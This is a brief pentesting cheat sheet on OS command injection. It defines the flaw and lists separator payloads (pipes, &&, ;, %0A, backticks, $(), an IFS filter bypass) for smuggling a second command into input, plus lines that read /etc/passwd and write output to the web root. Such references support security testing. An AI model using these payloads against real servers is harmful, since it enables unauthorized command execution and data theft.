# Command Injection

### What is command Injection?
OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute an arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.

### Conten
Depending on where your input is being injected you may need to terminate the quoted context (using " or ') before the commands.

### Command Injection/Execution
```
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2ยบ if 1ยบ finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2ยบ
ls %0A id # %0A Execute both (RECOMMENDED)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
